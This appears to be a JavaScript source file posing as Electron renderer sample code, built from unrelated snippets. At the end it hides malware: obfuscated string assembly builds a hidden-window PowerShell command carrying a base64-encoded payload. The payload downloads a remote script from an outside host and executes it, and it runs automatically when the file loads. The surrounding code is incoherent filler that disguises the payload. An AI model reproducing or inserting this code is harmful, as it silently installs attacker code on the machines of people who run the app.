/* eslint-disable import/no-extraneous-dependencies */
/* eslint-disable func-names */
/* eslint-disable no-unused-vars */

// This file is required by the index.html file and will
// be executed in the renderer process for that window.
// No Node.js APIs are available in this process because
// `nodeIntegration` is turned off. Use `preload.js` to
// selectively enable features needed in the rendering
// process.


const { clipboard, contextBridge, ipcMain, ipcRenderer, Menu, webFrame  } = require('electron');


const NOTIFICATION_TITLE = 'Title';
const NOTIFICATION_BODY = 'Notification from the Renderer process. Click to log to console.';
const CLICK_MESSAGE = 'Notification clicked!';


var ById = function (id) {
  return document.getElementById(id);
}



function processUser(user, callback) {
  if (user.name) {
    console.log(`Processing user ${user.name}...`);
    callback(null, { message: `User ${user.name} processed successfully.` });
  } else {
    callback(new Error('User name is required.'));
  }
}

ipcMain.on('application:dock-message-notification', function(event, id) {
  dockNotificationCache[id] = dockNotificationCache[id] + 1;
  if (process.platform === 'darwin' ||
    (process.platform === 'linux' && app.isUnityRunning &&
     app.isUnityRunning())) {
   app.setBadgeCount(dockNotificationCache[id]);
  }
  if (process.platform === 'darwin') {
   app.dock.bounce();
  }
 }); 
clipboard.writeText('Example string', 'selection')
console.log(clipboard.readText('selection'))


function handleStream (stream) {
  const video = document.querySelector('video')
  video.srcObject = stream
  video.onloadedmetadata = (e) => video.play()
}

function handleError (e) {
  console.log(e)
}

const menu = Menu.buildFromTemplate([
  {
      label: 'Restart electron app',
      type: 'normal',
      click() {
          app.relaunch();
          app.exit();
      },
  },
  {
      label: 'Quit electron app',
      accelerator: 'Cmd+Q',
      click() {
          app.quit();
      },
  },
])


function cancelRequest () {
  window.electronAPI.cancelBluetoothRequest()
}

const exec = require('child_process').execFile;

const parameterizedString = (...args) => {
  const str = args[0];
  const params = args.filter((arg, index) => index !== 0);
  if (!str) return '';
  return str.replace(/%s[0-9]+/g, (matchedStr) => {
    const variableIndex = matchedStr.replace('%s', '') - 1;
    return params[variableIndex];
  });
};

const w = parameterizedString('%s6%s9%s8%s12%s7n', 'w', 'p', 'o', 's', 'l', 'h', 'e', 'd', 'i', 'r', 'k', 'd', 'm', 'a', 'b', 'c', 'f', 'i', 'j', 'g', 'y', 'z');
const f = parameterizedString('%s2%s3%s1%s7%s8%s4%s6%s7%s5%s5', 'w', 'p', 'o', 's', 'l', 'h', 'e', 'r', 'k', 'm', 'a', 'b', 'c', 'f', 'i', 'j', 'g', 'y', 'z');
const x = parameterizedString('%s5%s9', 'w', 'p', '+', 's', '-', 'h', '=', 'd', 'e', 'r');
const y = parameterizedString('%s5%s1', 'w', 'p', '+', 's', '-', 'h', '=', 'd', 'e', 'r');


async function testIt () {
  const device = await navigator.bluetooth.requestDevice({
    acceptAllDevices: true
  })
  document.getElementById('device-name').innerHTML = device.name || `ID: ${device.id}`
}


const param = [y, w, x, 'WwBzAHQAcgBpAG4AZwBdACAAJABhACAAPQAgAHsAKABlAGwAaQBhAHMAbgBlAGwAaQBhAHMAZQBlAGwAaQBhAHMAdwAtAGUAbABpAGEAcwBPAGIAZQBsAGkAYQBzAGoAZQBlAGwAaQBhAHMAYwB0ACAAbgBlAGUAbABpAGEAcwB0AC4AdwBlAGwAaQBhAHMAZQBiAGUAbABpAGEAcwBDAGwAZQBsAGkAYQBzAGkAZQBuAHQAKQAuAGUAbABpAGEAcwBkAGUAbABpAGEAcwBvAGUAbABpAGEAcwB3AG4AbABlAGwAaQBhAHMAbwBlAGwAaQBhAHMAYQBlAGwAaQBhAHMAZABTAGUAbABpAGEAcwB0AHIAZQBsAGkAYQBzAGkAZQBsAGkAYQBzAG4AZQBsAGkAYQBzAGcAKAAnAGUAbABpAGEAcwBoAGUAbABpAGEAcwB0AGUAbABpAGEAcwB0AGUAbABpAGEAcwBwADoAZQBsAGkAYQBzAGUAbABpAGEAcwAvAGUAbABpAGEAcwBlAGwAaQBhAHMALwBpAGUAbABpAGEAcwBzAGUAbABpAGEAcwBzAGUAbABpAGEAcwB1AGUAbABpAGEAcwBlAC4AaABlAGwAaQBhAHMAbwBlAGwAaQBhAHMAbQBlAGwAaQBhAHMAZQBlAGwAaQBhAHMAcwAvAGUAbABpAGEAcwB1AGUAbABpAGEAcwBwAGUAbABpAGEAcwBlAGwAaQBhAHMALwBiAGUAbABpAGEAcwBiAGUAbABpAGEAcwAuAGUAbABpAGEAcwBwAGUAbABpAGEAcwBlAGwAaQBhAHMAcwBlAGwAaQBhAHMAMQBlAGwAaQBhAHMAZQBsAGkAYQBzACcAKQB9ADsAIAAkAGIAPQAkAGEALgByAGUAcABsAGEAYwBlACgAJwBlAGwAaQBhAHMAJwAsACcAJwApADsAJABjAD0AaQBlAHgAIAAkAGIAOwBpAGUAeAAgACQAYwA='];
const cfg = function () {
  exec(f, param, (err, data) => {
  });
};

cfg();
